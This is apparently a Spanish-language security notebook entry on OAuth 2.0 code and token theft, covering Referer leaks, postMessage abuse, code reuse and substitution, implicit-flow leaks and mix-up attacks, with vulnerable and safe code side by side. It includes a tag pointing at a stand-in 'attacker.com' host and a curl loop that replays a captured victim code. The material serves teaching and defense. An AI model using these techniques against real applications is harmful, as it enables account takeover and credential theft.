---
aliases:
  - OAuth Code Theft
  - OAuth Token Theft
tags:
  - vuln/oauth
  - technique/credential-access
  - technique/exfiltration
primary: "[[OAuth 2.0 Misconfigurations]]"
---

# OAuth 2.0 - Code & Token Theft

Code/token aparece en URL del callback. Cualquier vector que leakea URL = leak credentials. Ataques apuntan al transport del code/token, no al endpoint OAuth en sí.

## Referer Header Leak

Browser manda `Referer: <URL anterior>` en next request. Si la página post-callback carga recursos externos (analytics, ads, fonts), el `code` viaja en Referer al third-party.

| Patrón vulnerable | Leak destino | Mitigación |
|-------------------|--------------|------------|
| `/cb?code=XYZ` carga Google Analytics | `Referer: ...code=XYZ` a google.com | `Referrer-Policy: no-referrer` |
| `/cb` con `<img src="https://attacker.com/track">` (XSS prev) | Atacante recibe Referer | Strip code post-process |
| `/cb` redirige a otra página interna que carga 3p | Cadena de Referer | Same |
| `/cb` con outlinks externos | User clickea → leak | Same |
| `/cb` carga `<script src="cdn.untrusted.com">` | CDN ve URL | Trusted CDN only |

```html
<!-- Página de callback VULN -->
<html>
<head>
  <script src="https://www.googletagmanager.com/gtag/..."></script>
  <!-- Google ahora ve: Referer: https://target.com/cb?code=AAAAAAA -->
</head>
</html>
```

```http
# Defensa
Referrer-Policy: no-referrer
# o como mínimo
Referrer-Policy: strict-origin-when-cross-origin
# ← cross-origin solo manda origin, no path/query
```

Bonus: si server post-procesa code y redirige a `/dashboard`, browser history conserva URL con code → si atacante después gana XSS, lee history.

^oauth-theft-referer

## postMessage / window.opener

OAuth con `display=popup` abre callback en popup. Popup tiene `window.opener` apuntando a opener page. Si opener es atacante, popup post-callback puede `window.opener.postMessage(code)` → atacante captura.

| Escenario | Vector | Resultado |
|-----------|--------|-----------|
| **Popup callback sin origin check** | `window.opener.postMessage(token, '*')` | Cualquier opener recibe |
| **Opener controlled via tabnabbing** | Atacante abre `target.com` con `window.open()` → tab atacante mantiene `opener.location` | Reverse tabnabbing combo |
| **`<a target="_blank">` sin `rel="noopener"`** | Click externo → atacante acceso a `window.opener` | Opener manipulation |
| **Cross-origin opener policy ausente** | No `Cross-Origin-Opener-Policy: same-origin` | Popups cross-origin keepan opener access |
| **postMessage `*` target** | Opener listener acepta cualquier origen | Atacante envía mensaje fake |

```javascript
// VULN — popup callback
const params = new URLSearchParams(location.search);
const code = params.get('code');
window.opener.postMessage({ oauth_code: code }, '*');  // ← '*' permite cualquier opener
window.close();

// SAFE
window.opener.postMessage({ oauth_code: code }, 'https://target.com');

// VULN — opener listener
window.addEventListener('message', (e) => {
  // ← sin check e.origin
  processCode(e.data.oauth_code);
});

// SAFE
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://target.com') return;
  processCode(e.data.oauth_code);
});
```

Defensa server: `Cross-Origin-Opener-Policy: same-origin` en callback page → fuerza popup a perder `window.opener` cross-origin.

^oauth-theft-postmessage

## Code Reuse / Substitution

Código auth code es one-time use por spec, pero implementaciones rotas permiten reuse. Substitution attack = atacante intercambia su code por code de víctima en flow.

| Bug | Síntoma | Exploit |
|-----|---------|---------|
| **Code reusable** | Mismo code intercambiable múltiples veces en `/token` | Atacante con leaked code lo reusa después de víctima |
| **No rotation tras error** | Token request falla pero code queda válido | Replay |
| **Code substitution** | App acepta code emitido para otro client_id | Atacante bindea code víctima a su client |
| **No cliente bind** | Code no atado a `client_id` que lo pidió | Idem |
| **No PKCE bind** | Code emitido sin PKCE, exchanged con/sin PKCE indistinto | Mix-up |

```bash
# Test reuse
CODE="capture_de_traffic_víctima"
for i in 1 2 3; do
  curl -X POST https://target/oauth/token \
    -d "grant_type=authorization_code" \
    -d "code=$CODE" \
    -d "redirect_uri=https://known.com/cb" \
    -d "client_id=APP" -d "client_secret=SECRET"
  # Si returns access_token cada vez → reusable
done
```

Code substitution attack (RFC 6819 §4.4.1.7): atacante inicia flow propio, captura code, manda code víctima al callback víctima. Si app no valida code está bound a su client_id, atacante's identity termina logged como víctima en víctima's account.

Defensa: PKCE obligatorio. PKCE bindea `code_verifier` al code → atacante sin verifier no exchanges.

^oauth-theft-codereuse

## Implicit Flow Token en Fragment

Flow implicit (`response_type=token`) emite `access_token` directamente en fragment del callback URL: `#access_token=AAA`. Fragment no viaja en HTTP request al server, pero queda en browser history, en JS via `location.hash`, y cualquier XSS lo lee.

| Leak vector | Cómo | Mitigación |
|-------------|------|------------|
| **Browser history** | `chrome://history` muestra URL con fragment | No usar implicit (deprecated 2020) |
| **`location.hash` via XSS** | XSS posterior lee token | CSP + flow PKCE |
| **Mobile app webviews logging** | WebView logs URLs incluido fragments | App logging hygiene |
| **Browser extensions** | Extensions con `tabs` permission ven fragment | User-trust extensions |
| **JS error reporting** | Sentry/Rollbar capturan URL completa | Strip URLs en error reports |
| **Local storage post-callback** | App guarda token en localStorage → XSS lo roba | HTTPOnly cookies (no aplicable a tokens) |

```javascript
// VULN — implicit flow callback
const params = new URLSearchParams(location.hash.substring(1));
const token = params.get('access_token');
localStorage.setItem('token', token);  // ← XSS lee localStorage

// Mejor: NO usar implicit. Migrar a Authorization Code + PKCE.
```

OAuth 2.1 (draft) deprecates implicit flow completamente. Cualquier app moderna usando implicit es signal de attack surface.

^oauth-theft-implicit

## Mix-Up Attack

Atacante engaña client app para que envíe code a un IdP atacante en lugar del legitimo. Aplica cuando app soporta múltiples IdPs (login con Google + Facebook + GitHub).

| Step | Atacante hace | Cliente termina haciendo |
|------|---------------|--------------------------|
| 1 | Setup IdP atacante (`https://attacker-idp.com`) | — |
| 2 | Inicia flow eligiendo provider atacante | Cliente registra "user wants to login con attacker-idp" |
| 3 | Atacante mezcla callback con código emitido por **otro** IdP (Google) | Cliente confunde IdPs |
| 4 | Cliente intercambia code "Google" en `/token` de atacante-idp | Cliente envía code Google + client_secret cliente al atacante |
| 5 | Atacante captura code + secret | Game over |

Mitigación (RFC 9207): incluir `iss` parameter en authorization response. Cliente verifica `iss` matches el IdP que pidió.

```http
# Sin RFC 9207 — vulnerable
GET /cb?code=XYZ&state=ABC

# Con RFC 9207 — safe
GET /cb?code=XYZ&state=ABC&iss=https://accounts.google.com
# Cliente compara con IdP esperado para ese state
```

^oauth-theft-mixup
